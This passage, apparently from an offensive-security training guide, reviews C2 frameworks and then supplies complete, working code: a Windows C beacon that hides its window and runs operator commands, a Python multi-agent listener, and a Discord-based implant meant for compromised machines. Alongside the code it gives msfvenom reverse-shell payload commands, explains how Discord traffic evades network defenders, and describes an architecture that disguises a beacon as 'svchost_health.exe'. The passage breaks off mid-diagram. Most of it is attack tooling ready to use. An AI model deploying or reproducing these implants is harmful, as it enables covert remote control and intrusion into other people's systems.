```

---

## Section 7 — C2 Framework Reference

These are the tools in the ecosystem. Know what exists, what their
characteristics are, and when to use which.

### Cobalt Strike

The commercial standard. ~$5,500/yr per operator. Used by nation-states
and criminal groups. Extensively signatured.

```
COBALT STRIKE PROFILE:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

Language:        Java (team server), C (beacon)
Beacon type:     Stageable/Stageless HTTP/S, DNS, SMB pipe, TCP
Listener types:  HTTP, HTTPS, DNS, SMB, TCP, foreign listener (Metasploit)
Key features:    Malleable C2 profiles, Beacon Object Files (BOFs), 
                 process injection, lateral movement, Kerberos attacks
Detection risk:  HIGH — extensively signatured. Default config is caught
                 by every EDR. Custom profiles and BOFs needed.
OPSEC:           Cracked versions (leaked) are particularly dangerous —
                 watermarked, tracked by MSRC and threat intel firms

Use case: enterprise red teaming where you own the license and can
  invest time in custom profiles and evasion
```

### Havoc C2

Open source, modern, actively developed. C2 framework designed with
evasion as a core design goal.

```
HAVOC C2 PROFILE:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

Language:        C (server), C (Demon agent), Go (team server UI)
Beacon type:     HTTP/S, SMB, TCP
Key features:    Sleep obfuscation (Ekko/FOLIAGE/ZILEAN), indirect syscalls,
                 AMSI/ETW bypass, process injection (various techniques),
                 BOF support, custom agent modules
Detection risk:  LOWER than CS default but growing (signatures emerging)
Open source:     https://github.com/HavocFramework/Havoc
Cost:            Free

DEMON AGENT EVASION FEATURES:
  - Sleep encryption: encrypts agent in memory during sleep (defeats memory scanning)
  - Stack duplication: moves agent off legitimate call stack during sleep
  - Indirect syscalls: bypasses API hooks by calling syscalls directly
  - AMSI patching: disables AMSI before running scripts
  - ETW patching: disables Event Tracing for Windows

Use case: when CS is too expensive or too signatured, Havoc with
  proper customisation is a competitive alternative
```

### Sliver

Open source C2 by Bishop Fox. Go-based. Multi-protocol.

```
SLIVER PROFILE:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

Language:        Go (server + implant)
Beacon type:     HTTP/S, DNS, Mutual TLS (mTLS), WireGuard
Key features:    Unique per-binary implant compilation (frustrates signature matching),
                 Armory (extension marketplace), BOF support, multiplayer
Detection risk:  MODERATE — Go binaries are larger and have different characteristics
                 than C implants; mTLS is unusual and detectable
Open source:     https://github.com/BishopFox/sliver
Cost:            Free

USE UNIQUE IMPLANTS:
  # Sliver compiles a new implant binary for each operation/target
  # Each binary has different internal constants, resource strings, and hashes
  # Signature-based detection requires re-signing each variant
  generate --http c2.example.com --os windows --arch amd64 --save implant.exe
```

### Metasploit Framework

The veteran. Free. Enormous exploit module library. Meterpreter is
extensively signatured but still used for initial access and non-contested
environments.

```
METASPLOIT C2:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

Language:        Ruby (framework), C (Meterpreter)
Beacon type:     Reverse TCP, Reverse HTTPS, Reverse HTTP, bind TCP
Key features:    Vast exploit library, post-exploitation modules,
                 pivoting (route through sessions), Meterpreter extensions
Detection risk:  CRITICAL on modern endpoints — Meterpreter default is caught
                 by everything. Use only for: CTF, lab, exploit PoC, non-monitored targets
Evasion options: Custom stagers, encrypted Meterpreter, payload encryption plugins

# Basic Meterpreter handler:
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_https
set LHOST 0.0.0.0
set LPORT 443
set ExitOnSession false
exploit -j

# Generate shellcode (pipe into custom loader for evasion):
msfvenom -p windows/x64/meterpreter/reverse_https \
  LHOST=redirector.c2.com LPORT=443 \
  -f raw -o meterpreter.bin
```

### Mythic

Open source, modular, agent-agnostic. The team server is Mythic.
Agents (Hermes, Apfell, Poseidon, etc.) are separate projects that
integrate with Mythic. Multi-language, multi-OS.

```
MYTHIC PROFILE:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

Language:        Python (server), agent-dependent
Architecture:    Container-based (Docker), modular agents and C2 profiles
Key features:    Web UI, multiple simultaneous agents of different types,
                 GraphQL API for programmatic access, extensive logging
Open source:     https://github.com/its-a-feature/Mythic
Cost:            Free

Use case: research, multi-agent environments, when you want to run
  different agent types per target (macOS, Linux, Windows) from one console
  
# Install:
git clone https://github.com/its-a-feature/Mythic
cd Mythic && sudo ./install_docker_ubuntu.sh
sudo make
# Then install agents via Mythic UI → Payload Management → Install Agents
```

---

## Building a C Beacon from Zero

**WHAT IT IS**: A raw Windows C program that acts as a full beacon. It initialises
Winsock, connects outbound to your operator machine, sends a JSON heartbeat with
system information on every cycle, waits to receive a command string, executes it
via `CreateProcess` with output piped back, sends the output, sleeps with jitter,
repeats. No libraries. No framework. Pure Win32 API.

**WHY IT MATTERS**: Every C2 framework generates beacons with known signatures.
If you understand exactly what a beacon does at the socket and Win32 API level, you can
build one from scratch — one that no signature engine has seen before. CHEYANNE uses
exactly this approach: `svchost_health.exe` is a compiled C heartbeat beacon running
against a Discord bot channel. Understanding the primitives means you can port this to
any transport.

**HOW TO BUILD IT**: The code below is a complete, compilable Windows C beacon. Read
every comment. It covers WSAStartup, socket connect, JSON serialisation without a
library, `CreateProcess` with anonymous pipes for output capture, and jitter sleep.

```c
/*
 * beacon.c — Minimal C2 beacon for Windows
 *
 * COMPILE (MinGW-w64 cross from Linux/WSL2):
 *   x86_64-w64-mingw32-gcc beacon.c -o beacon.exe -lws2_32 -Wall -O2
 *
 * COMPILE (MSYS2 UCRT64 terminal on Windows):
 *   gcc beacon.c -o beacon.exe -lws2_32 -Wall -O2
 *
 * Run your listener first:
 *   python operator_listener.py
 * Then execute beacon.exe on the target.
 *
 * EXPECTED OUTPUT on operator side:
 *   [+] New agent: DESKTOP-ABC / george / PID 4321 / Windows 10
 *   > whoami
 *   desktop-abc\george
 */

#include <winsock2.h>   /* WSAStartup, socket, connect, send, recv — link -lws2_32 */
#include <ws2tcpip.h>   /* inet_pton, getaddrinfo */
#include <windows.h>    /* CreateProcess, GetComputerNameA, GetUserNameA, ExitProcess */
#include <stdio.h>      /* sprintf, snprintf */
#include <string.h>     /* strlen, memset */
#include <stdlib.h>     /* rand, srand */
#include <time.h>       /* time — used for srand seed and kill date */

/* ── CONFIG ── change these before compiling ── */
#define C2_HOST   "127.0.0.1"   /* operator listener IP */
#define C2_PORT   4444           /* operator listener port */
#define SLEEP_BASE  30           /* base beacon interval in seconds */
#define SLEEP_JITTER 40          /* jitter percentage: ±40% of base */
/* ─────────────────────────────────────────── */

#define BUFSIZE   8192           /* output buffer — 8KB per read chunk */

/*
 * jitter_sleep — sleep for base seconds ± jitter percent
 *
 * Example: base=30, jitter=40
 *   range  = 30 * 0.40 = 12 seconds
 *   actual = 30 + rand in [-12, +12]
 *   result: anywhere from 18s to 42s
 *
 * This breaks IDS time-series correlation.
 * A beacon firing at exactly T+30, T+60, T+90 is trivially flagged.
 * A beacon firing at T+22, T+41, T+33 looks like background noise.
 */
void jitter_sleep(int base_sec, int jitter_pct) {
    double range = base_sec * (jitter_pct / 100.0);      /* ± window in seconds */
    double offset = ((double)rand() / RAND_MAX) * 2.0 * range - range; /* [-range, +range] */
    int actual = (int)(base_sec + offset);
    if (actual < 1) actual = 1;                          /* floor: never sleep 0 */
    Sleep(actual * 1000);                                /* Sleep() takes milliseconds */
}

/*
 * run_command — execute cmd string via CreateProcess, capture all output
 *
 * CreateProcess is the Win32 API for launching processes. We create two
 * anonymous pipes: one for stdout, one for stderr. The child process writes
 * to the write-end of each pipe. We read from the read-end after the child exits.
 *
 * Returns: heap-allocated string with combined stdout+stderr.
 *          Caller must free() this.
 */
char* run_command(const char* cmd) {
    SECURITY_ATTRIBUTES sa;
    sa.nLength = sizeof(SECURITY_ATTRIBUTES);
    sa.lpSecurityDescriptor = NULL;
    sa.bInheritHandle = TRUE;               /* child inherits pipe handles */

    HANDLE hReadOut,  hWriteOut;            /* stdout pipe: parent reads, child writes */
    HANDLE hReadErr,  hWriteErr;            /* stderr pipe: parent reads, child writes */

    /* create the stdout pipe */
    if (!CreatePipe(&hReadOut, &hWriteOut, &sa, 0)) return _strdup("pipe_error");

    /* create the stderr pipe */
    if (!CreatePipe(&hReadErr, &hWriteErr, &sa, 0)) {
        CloseHandle(hReadOut); CloseHandle(hWriteOut);
        return _strdup("pipe_error");
    }

    /* the parent doesn't need to write to stdout/stderr — mark not inheritable */
    SetHandleInformation(hReadOut, HANDLE_FLAG_INHERIT, 0);
    SetHandleInformation(hReadErr, HANDLE_FLAG_INHERIT, 0);

    /* build "cmd.exe /c <command>" string */
    char full_cmd[1024];
    snprintf(full_cmd, sizeof(full_cmd), "cmd.exe /c %s", cmd);

    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    ZeroMemory(&pi, sizeof(pi));
    si.cb          = sizeof(si);
    si.dwFlags     = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;               /* hide the console window */
    si.hStdOutput  = hWriteOut;             /* child stdout → our pipe */
    si.hStdError   = hWriteErr;             /* child stderr → our pipe */

    /* launch the process */
    BOOL ok = CreateProcessA(
        NULL,       /* lpApplicationName: NULL = use lpCommandLine */
        full_cmd,   /* lpCommandLine: the full "cmd.exe /c whoami" string */
        NULL,       /* lpProcessAttributes */
        NULL,       /* lpThreadAttributes */
        TRUE,       /* bInheritHandles: TRUE so child gets our pipe handles */
        0,          /* dwCreationFlags */
        NULL,       /* lpEnvironment: inherit parent's environment */
        NULL,       /* lpCurrentDirectory: inherit parent's cwd */
        &si,        /* lpStartupInfo */
        &pi         /* lpProcessInformation: filled by CreateProcess */
    );

    /* close the write-ends in the parent — child has its own copy */
    CloseHandle(hWriteOut);
    CloseHandle(hWriteErr);

    if (!ok) {
        CloseHandle(hReadOut); CloseHandle(hReadErr);
        return _strdup("createprocess_failed");
    }

    /* wait for the child to finish */
    WaitForSingleObject(pi.hProcess, 10000); /* 10-second timeout */

    /* collect all output — read stdout first, then stderr */
    char* result = (char*)malloc(BUFSIZE * 4);
    if (!result) { CloseHandle(pi.hProcess); CloseHandle(pi.hThread); return NULL; }
    result[0] = '\0';
    int pos = 0;

    DWORD bytes_read;
    char chunk[BUFSIZE];

    /* drain stdout pipe */
    while (ReadFile(hReadOut, chunk, BUFSIZE - 1, &bytes_read, NULL) && bytes_read > 0) {
        chunk[bytes_read] = '\0';
        strncat(result + pos, chunk, BUFSIZE * 4 - pos - 1);
        pos += bytes_read;
    }
    /* drain stderr pipe */
    while (ReadFile(hReadErr, chunk, BUFSIZE - 1, &bytes_read, NULL) && bytes_read > 0) {
        chunk[bytes_read] = '\0';
        strncat(result + pos, chunk, BUFSIZE * 4 - pos - 1);
        pos += bytes_read;
    }

    CloseHandle(hReadOut);
    CloseHandle(hReadErr);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    if (pos == 0) return _strdup("(no output)");
    return result;
}

int main(void) {
    srand((unsigned int)time(NULL));         /* seed RNG for jitter */

    /* initialise Winsock — required before any socket calls on Windows */
    WSADATA wsa;
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
        /* MAKEWORD(2,2) requests Winsock version 2.2 — the current standard */
        return 1;
    }

    /* gather system info — sent in every heartbeat */
    char hostname[256] = {0};
    char username[256] = {0};
    DWORD hlen = sizeof(hostname);
    DWORD ulen = sizeof(username);
    GetComputerNameA(hostname, &hlen);       /* fills hostname with NETBIOS name */
    GetUserNameA(username, &ulen);           /* fills username with current user */
    DWORD pid = GetCurrentProcessId();       /* our own PID */

    /* beacon loop — runs forever until kill date or network failure */
    while (1) {
        /* ── open a fresh TCP socket each cycle ── */
        SOCKET s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if (s == INVALID_SOCKET) {
            jitter_sleep(SLEEP_BASE, SLEEP_JITTER);
            continue;                        /* try again next cycle */
        }

        struct sockaddr_in srv;
        srv.sin_family = AF_INET;
        srv.sin_port   = htons(C2_PORT);     /* htons converts host→network byte order */
        inet_pton(AF_INET, C2_HOST, &srv.sin_addr); /* convert dotted-decimal to binary */

        if (connect(s, (struct sockaddr*)&srv, sizeof(srv)) != 0) {
            closesocket(s);
            jitter_sleep(SLEEP_BASE, SLEEP_JITTER);
            continue;                        /* operator not listening — retry */
        }

        /* ── send heartbeat JSON ── */
        /* build minimal JSON manually — no library dependency */
        char heartbeat[1024];
        snprintf(heartbeat, sizeof(heartbeat),
            "{\"hostname\":\"%s\",\"username\":\"%s\",\"pid\":%lu,\"os\":\"Windows\"}\n",
            hostname, username, (unsigned long)pid);

        send(s, heartbeat, (int)strlen(heartbeat), 0);

        /* ── receive a command (operator types it) ── */
        char cmd_buf[1024] = {0};
        int n = recv(s, cmd_buf, sizeof(cmd_buf) - 1, 0);

        if (n > 0) {
            cmd_buf[n] = '\0';

            /* strip trailing newline/carriage-return from operator input */
            while (n > 0 && (cmd_buf[n-1] == '\n' || cmd_buf[n-1] == '\r')) {
                cmd_buf[--n] = '\0';
            }

            if (strcmp(cmd_buf, "exit") == 0) {
                /* operator ordered clean disconnect */
                closesocket(s);
                break;
            }

            /* execute the command and get output */
            char* output = run_command(cmd_buf);

            /* send output back — may be multiple KB */
            if (output) {
                send(s, output, (int)strlen(output), 0);
                free(output);
            }
        }

        closesocket(s);                      /* close socket — reconnect next cycle */
        jitter_sleep(SLEEP_BASE, SLEEP_JITTER);
    }

    WSACleanup();                            /* release Winsock resources */
    return 0;
}
```

### Compile Commands

```bash
# From MSYS2 UCRT64 terminal (Windows native):
gcc beacon.c -o beacon.exe -lws2_32 -Wall -O2

# From WSL2 / Linux (cross-compile for Windows target):
x86_64-w64-mingw32-gcc beacon.c -o beacon.exe -lws2_32 -Wall -O2

# -lws2_32 : links ws2_32.dll — required for all Winsock functions
# -Wall     : show all warnings — keep this during development
# -O2       : optimisation level 2 — smaller, faster binary
```

### Expected Output

```
# Operator terminal — Python listener running:
[*] Listening on 0.0.0.0:4444
[+] Connection from 192.168.1.50:52341
[+] HEARTBEAT: {"hostname":"DESKTOP-ABC","username":"george","pid":4321,"os":"Windows"}
[+] Agent registered: DESKTOP-ABC | george | PID 4321

Agents:
  [0] DESKTOP-ABC  george  192.168.1.50  PID 4321

Select agent> 0
Command> whoami
[*] Sent: whoami
[*] Output:
desktop-abc\george

Command> ipconfig
[*] Sent: ipconfig
[*] Output:
Windows IP Configuration
Ethernet adapter Ethernet:
   IPv4 Address. . . : 192.168.1.50
   Subnet Mask . . . : 255.255.255.0
   Default Gateway . : 192.168.1.1
```

**Failure: `beacon.exe exits immediately`** — the operator listener is not running.
Start `operator_listener.py` before running the beacon.

**Failure: `undefined reference to 'WSAStartup'`** — missing `-lws2_32`. Add it.

**Failure: `beacon.c:1:22: fatal error: winsock2.h: No such file`** — wrong compiler.
Use `x86_64-w64-mingw32-gcc` or the MinGW gcc from MSYS2 UCRT64, not Linux system gcc.

// DRILL: Compile beacon.c. Start the Python operator listener. Run beacon.exe. Send `whoami`. Confirm output arrives. Then modify C2_HOST to a dead IP and watch the beacon retry silently with jitter.

---

## Python Operator Listener

**WHAT IT IS**: An asyncio TCP server running on the operator's machine. Multiple beacons
connect simultaneously. The operator sees a live agent table (hostname, IP, PID), selects
a target, types commands, receives output. Full concurrent multi-agent handling.

**WHY IT MATTERS**: The C beacon above connects to whatever is listening on port 4444.
This is what's listening. It demonstrates the full communication model: beacon-in from
target, command-out from operator, output-in from target. In CHEYANNE, the equivalent
is the Discord bot polling a channel — this raw TCP version is architecturally identical,
just a different transport.

**HOW TO BUILD IT**: The code below is complete. Run it. It handles multiple simultaneous
connections in an asyncio event loop. No dependencies beyond Python standard library.

```python
# operator_listener.py — asyncio multi-agent TCP C2 listener
#
# RUN:
#   python operator_listener.py
#
# DEPENDENCIES: none (asyncio, json, sys are stdlib)
#
# EXPECTED OUTPUT:
#   [*] Listening on 0.0.0.0:4444
#   [+] Connection from 192.168.1.50:52341
#   [+] HEARTBEAT: {"hostname":"DESKTOP-ABC",...}

import asyncio        # async TCP server — handle multiple beacons concurrently
import json           # parse heartbeat JSON from beacons
import sys            # sys.stdin for interactive command input
import threading      # run input() loop in a thread alongside asyncio event loop
import time           # timestamp for agent table

# ── agent registry ── thread-safe dict of connected agents ──
# Key: (host, port) tuple
# Value: dict with hostname, username, pid, writer (asyncio StreamWriter)
agents = {}
agents_lock = threading.Lock()

LISTEN_HOST = "0.0.0.0"   # accept connections on all interfaces
LISTEN_PORT = 4444         # must match C2_PORT in beacon.c


def print_agents():
    """Print the current agent table to the operator."""
    with agents_lock:
        if not agents:
            print("[!] No active agents.")
            return
        print("\n  ID  HOSTNAME          USER        IP              PID")
        print("  " + "-" * 58)
        for idx, (addr, info) in enumerate(agents.items()):
            print(f"  [{idx}] {info['hostname']:<16}  {info['username']:<10}  "
                  f"{addr[0]:<14}  {info['pid']}")
        print()


async def handle_beacon(reader: asyncio.StreamReader, writer: asyncio.StreamWriter):
    """
    Called once per incoming beacon connection.
    Runs concurrently for every connected agent.

    Protocol:
      1. Read first line — JSON heartbeat from beacon
      2. Register agent in global dict
      3. Wait for operator to send a command via the command_queue
      4. Send command to beacon
      5. Read output lines until beacon closes connection
      6. Print output, deregister agent
    """
    addr = writer.get_extra_info('peername')   # (ip, port) tuple
    print(f"\n[+] Connection from {addr[0]}:{addr[1]}")

    # ── step 1: read heartbeat JSON ──
    try:
        line = await asyncio.wait_for(reader.readline(), timeout=10.0)
    except asyncio.TimeoutError:
        writer.close()
        return

    raw = line.decode(errors='replace').strip()
    print(f"[+] HEARTBEAT: {raw}")

    try:
        info = json.loads(raw)
    except json.JSONDecodeError:
        print(f"[!] Bad JSON from {addr[0]}")
        writer.close()
        return

    # ── step 2: register agent ──
    info['addr']  = addr
    info['writer'] = writer
    info['queue']  = asyncio.Queue()   # operator puts commands here

    with agents_lock:
        agents[addr] = info

    print(f"[+] Agent registered: {info.get('hostname','?')} | "
          f"{info.get('username','?')} | PID {info.get('pid','?')}")
    print_agents()

    # ── step 3-5: wait for commands from operator, relay output ──
    try:
        while True:
            # block until operator puts a command in this agent's queue
            cmd = await info['queue'].get()

            if cmd == "__disconnect__":
                break

            # send command to beacon
            writer.write((cmd + "\n").encode())
            await writer.drain()

            # read output until connection closes or timeout
            output_chunks = []
            try:
                while True:
                    chunk = await asyncio.wait_for(
                        reader.read(4096), timeout=8.0
                    )
                    if not chunk:
                        break                 # beacon closed connection
                    output_chunks.append(chunk.decode(errors='replace'))
            except asyncio.TimeoutError:
                pass                          # no more data — output complete

            output = "".join(output_chunks)
            print(f"\n[*] Output:\n{output}")

    except (ConnectionResetError, asyncio.IncompleteReadError):
        pass

    # ── step 6: deregister ──
    with agents_lock:
        agents.pop(addr, None)

    writer.close()
    print(f"[-] Agent disconnected: {addr[0]}")


def operator_input_loop(loop: asyncio.AbstractEventLoop):
    """
    Runs in a separate thread. Reads commands from stdin.
    The asyncio event loop is running in the main thread;
    this thread submits coroutines to it via run_coroutine_threadsafe.

    Two-step interaction:
      1. operator selects agent by index
      2. operator types commands for that agent
    """
    print("[*] Operator console ready. Type 'agents' to list, or select an agent by index.")

    while True:
        try:
            raw = input("Select agent (index) or 'agents'> ").strip()
        except EOFError:
            break

        if raw == "agents":
            print_agents()
            continue

        try:
            idx = int(raw)
        except ValueError:
            print("[!] Enter a number (agent index) or 'agents'")
            continue

        # get the agent at this index
        with agents_lock:
            agent_list = list(agents.values())

        if idx >= len(agent_list) or idx < 0:
            print(f"[!] No agent at index {idx}")
            continue

        agent = agent_list[idx]
        hostname = agent.get('hostname', '?')
        queue = agent['queue']

        print(f"[*] Selected: {hostname}. Type commands. 'back' to deselect, 'exit' to disconnect agent.")

        while True:
            try:
                cmd = input(f"{hostname}> ").strip()
            except EOFError:
                break

            if cmd == "back":
                break

            if cmd == "exit":
                # send disconnect sentinel
                asyncio.run_coroutine_threadsafe(
                    queue.put("__disconnect__"), loop
                )
                break

            if not cmd:
                continue

            # put command in agent's queue — handle_beacon will pick it up
            asyncio.run_coroutine_threadsafe(
                queue.put(cmd), loop
            )

            # small delay to let output print before next prompt
            time.sleep(0.5)


async def main():
    """Start the TCP listener and launch the operator input thread."""
    server = await asyncio.start_server(
        handle_beacon, LISTEN_HOST, LISTEN_PORT
    )
    print(f"[*] Listening on {LISTEN_HOST}:{LISTEN_PORT}")

    # start operator input in a background thread
    # (input() is blocking — can't run in async event loop directly)
    loop = asyncio.get_event_loop()
    t = threading.Thread(target=operator_input_loop, args=(loop,), daemon=True)
    t.start()

    async with server:
        await server.serve_forever()


if __name__ == "__main__":
    asyncio.run(main())
```

### Expected Output

```
# Terminal 1 — start listener:
python operator_listener.py
[*] Listening on 0.0.0.0:4444
[*] Operator console ready. Type 'agents' to list, or select an agent by index.

# Terminal 2 — run beacon:
beacon.exe

# Back in Terminal 1 — beacon connects:
[+] Connection from 127.0.0.1:52341
[+] HEARTBEAT: {"hostname":"DESKTOP-ABC","username":"george","pid":4321,"os":"Windows"}
[+] Agent registered: DESKTOP-ABC | george | PID 4321

  ID  HOSTNAME          USER        IP              PID
  ----------------------------------------------------------
  [0] DESKTOP-ABC       george      127.0.0.1       4321

Select agent (index) or 'agents'> 0
[*] Selected: DESKTOP-ABC. Type commands. 'back' to deselect.
DESKTOP-ABC> whoami
[*] Output:
desktop-abc\george

DESKTOP-ABC> net user
[*] Output:
User accounts for \\DESKTOP-ABC
george   Administrator   DefaultAccount   Guest
```

// DRILL: Run the listener. Run the beacon. Send three different commands. Observe the jitter in beacon reconnection timing. Kill the listener, watch the beacon retry silently.

---

## Discord as a Covert C2 Channel

**WHAT IT IS**: A Python bot that polls a private Discord channel for command messages,
executes them locally via `subprocess`, and posts output back to the channel. The operator
types commands into Discord. The implant on the target machine sees them and responds.

**WHY IT MATTERS**: Discord traffic looks exactly like any other user's Discord usage.
It runs over TLS on port 443. Discord's CDN is hosted by Cloudflare — a trusted,
categorised domain that almost no corporate proxy blocks. An analyst looking at outbound
connections from a workstation will see `discord.com` and `cdn.discordapp.com` — normal.
They will not see your C2 traffic.

Specific reasons Discord bypasses most defences:
1. **TLS on port 443** — all traffic encrypted, content invisible to DPI
2. **Legitimate CDN** — `discord.com` is pre-categorised as "Social Networking" or
   "Messaging" in every major proxy (Zscaler, Palo Alto, Cisco Umbrella)
3. **Domain age** — Discord's domain is years old, zero threat intel hits
4. **No dedicated port** — no unusual port to block, no port 4444 in firewall logs
5. **Websocket keep-alive** — the bot maintains a persistent websocket, no
   visible polling pattern (unlike raw TCP which reconnects every beacon cycle)

**HOW TO BUILD IT**: You need a Discord bot token and a private guild (server).
Create the bot at https://discord.com/developers/applications. Add it to a private
server. Get the target channel ID. The code below runs on the compromised machine.

```
# Install dependency — discord.py (do this once on operator machine and implant):
pip install discord.py
```

```python
# discord_beacon.py — Discord-channel C2 implant
#
# RUN ON TARGET:
#   pip install discord.py
#   python discord_beacon.py
#
# OPERATOR:
#   Open Discord → go to your private C2 channel
#   Type: !cmd whoami
#   Bot responds with output in same channel
#
# SECURITY NOTE:
#   Prefix commands with a unique token so the bot ignores unrelated messages.
#   Example prefix: !c2x7q_ — something no human would type accidentally.

import discord          # discord.py — handles bot auth, event loop, channel API
import subprocess       # run commands locally on the compromised machine
import platform         # get OS info for check-in message
import os               # getenv for token, getpid for beacon ID
import socket           # gethostname, gethostbyname for IP

# ── CONFIG — set these before deploying ──
BOT_TOKEN   = "YOUR_BOT_TOKEN_HERE"       # from discord.com/developers/applications
CHANNEL_ID  = 1234567890123456789         # right-click channel → Copy ID (developer mode on)
CMD_PREFIX  = "!cmd"                      # operator must start commands with this prefix
# ─────────────────────────────────────────

# discord.Intents controls what events the bot receives
# message_content is required to read message text (privileged intent — enable in portal)
intents = discord.Intents.default()
intents.message_content = True

client = discord.Client(intents=intents)


@client.event
async def on_ready():
    """
    Fires once when the bot successfully connects to Discord.
    Sends a check-in message to the C2 channel with host info.
    """
    hostname = socket.gethostname()
    try:
        ip = socket.gethostbyname(hostname)
    except Exception:
        ip = "unknown"

    checkin_msg = (
        f"**[BEACON ONLINE]**\n"
        f"Host: `{hostname}`\n"
        f"IP: `{ip}`\n"
        f"OS: `{platform.platform()}`\n"
        f"PID: `{os.getpid()}`\n"
        f"User: `{os.getenv('USERNAME', os.getenv('USER', 'unknown'))}`\n"
        f"Awaiting commands with prefix `{CMD_PREFIX}`"
    )

    channel = client.get_channel(CHANNEL_ID)
    if channel:
        await channel.send(checkin_msg)      # post check-in to C2 channel


@client.event
async def on_message(message: discord.Message):
    """
    Fires for every message in every channel the bot can see.
    Filter: only process messages in our C2 channel with the right prefix.
    The bot ignores its own messages to prevent feedback loops.
    """

    # ignore the bot's own messages — otherwise we'd loop on our own output
    if message.author == client.user:
        return

    # only process messages in the designated C2 channel
    if message.channel.id != CHANNEL_ID:
        return

    # only process messages that start with our command prefix
    if not message.content.startswith(CMD_PREFIX):
        return

    # extract the actual command — everything after the prefix and a space
    cmd = message.content[len(CMD_PREFIX):].strip()

    if not cmd:
        await message.channel.send("Empty command.")
        return

    # ── execute the command via subprocess ──
    # shell=True so we can run cmd.exe built-ins like 'dir', 'set', etc.
    # timeout=30 prevents operator from accidentally hanging the implant
    try:
        result = subprocess.run(
            cmd,
            shell=True,
            capture_output=True,
            text=True,
            timeout=30
        )
        output = result.stdout + result.stderr
    except subprocess.TimeoutExpired:
        output = "[TIMEOUT] Command exceeded 30 seconds."
    except Exception as e:
        output = f"[ERROR] {str(e)}"

    if not output:
        output = "(no output)"

    # Discord message limit is 2000 chars — split if needed
    # Wrap in code block for readability
    max_chunk = 1900                         # leave room for code fences
    chunks = [output[i:i+max_chunk] for i in range(0, len(output), max_chunk)]

    for chunk in chunks:
        await message.channel.send(f"```\n{chunk}\n```")


# run the bot — this blocks indefinitely (keeps polling Discord's websocket)
client.run(BOT_TOKEN)
```

### Operator Workflow

```
Discord private channel — C2 comms:

[BOT] **[BEACON ONLINE]**
      Host: DESKTOP-ABC
      IP: 192.168.1.50
      OS: Windows-10-10.0.22621
      PID: 4321
      User: george
      Awaiting commands with prefix !cmd

[OPERATOR] !cmd whoami
[BOT] ```
      desktop-abc\george
      ```

[OPERATOR] !cmd net localgroup administrators
[BOT] ```
      Alias name     administrators
      Members: Administrator, george
      ```

[OPERATOR] !cmd systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
[BOT] ```
      OS Name: Microsoft Windows 10 Pro
      OS Version: 10.0.22621 N/A Build 22621
      ```
```

### Why Discord Evades Network Defenders

```
NETWORK DEFENDER VIEW — what they see:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

Proxy logs:
  CONNECT discord.com:443       ← categorised "Social Networking" — allowed
  CONNECT cdn.discordapp.com    ← categorised "Content Delivery" — allowed
  CONNECT gateway.discord.gg    ← Discord websocket gateway — allowed

NetFlow:
  192.168.1.50:RANDOM → 162.159.x.x:443    (Cloudflare IP for discord.com)
  Long-lived connection (Discord websocket stays open for hours)
  ← looks identical to a user with Discord open in the background

Packet capture (DPI):
  All TLS. Content encrypted. No signature to match.

JA3:
  discord.py uses Python's ssl module → matches standard Python TLS fingerprint
  No known-bad JA3 signatures

WHAT DOESN'T BLEND:
  - Discord traffic at 3AM when no employees are at work
  - Discord running on a server (workstations use Discord, not servers)
  - Unusual accounts (bot tokens have no profile picture, age, etc.)
  - Output volume: large command outputs mean large uploads to Discord
    (a systeminfo dump is 4KB — unusual for a "chat" message)
```

// DRILL: Create a test Discord server. Create a bot. Paste your token and channel ID. Run discord_beacon.py on your local machine. Send !cmd whoami from your phone via Discord mobile. Confirm output arrives. Then capture traffic in Wireshark — confirm it's all TLS to discord.com.

---

## CHEYANNE Architecture

**WHAT IT IS**: A multi-layer C2 architecture built by 22DIV for controlled research
and authorised engagements. The architecture uses multiple communication channels
in a hierarchy: a C beacon for heartbeat, a Python implant for interactive commands,
and a Discord bridge for covert operator communication.

**WHY IT MATTERS**: No single channel is relied upon. If the Discord bot is blocked,
the TCP listener catches the heartbeat. If TCP is filtered, Discord still works.
Layered infrastructure means losing one channel does not lose the operation.

```
CHEYANNE ARCHITECTURE — FULL KILL CHAIN:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

                         ┌─────────────────────────────┐
                         │   OPERATOR MACHINE (22DIV)  │
                         │   192.168.1.92               │
                         │                             │
                         │   ┌─────────────────────┐  │
                         │   │  cheyanne_agent.py  │  │
                         │   │  (AI operator UI)   │  │
                         │   │  Ollama / Claude     │  │
                         │   └────────┬────────────┘  │
                         │            │                │
                         │   ┌────────▼────────────┐  │
                         │   │  operator_listener  │  │
                         │   │  TCP :4443           │  │
                         │   └────────┬────────────┘  │
                         └────────────│────────────────┘
                                      │
                         CHANNEL 1: TCP reverse shell (port 4443)
                         ← direct, fast, noisy, for interactive ops
                                      │
             ╔════════════════════════▼═══════════════════════════╗
             ║          NETWORK BOUNDARY / INTERNET                ║
             ║      (or LAN segment — same principle)              ║
             ╚════════════════════════╤═══════════════════════════╝
                                      │
                         CHANNEL 2: Discord (port 443, TLS, CDN)
                         ← covert, survives proxy, async, operator
                         ← uses discord.com — pre-categorised, trusted
                                      │
                         ┌────────────▼────────────────────────────┐
                         │   TARGET MACHINE                        │
                         │   Radon_Laptop1 / 192.168.1.145        │
                         │                                        │
                         │   ┌──────────────────────────────┐    │
                         │   │  svchost_health.exe  (C)     │    │
                         │   │  Heartbeat-only beacon        │    │
                         │   │  TCP connect → :4443 every 60s│   │
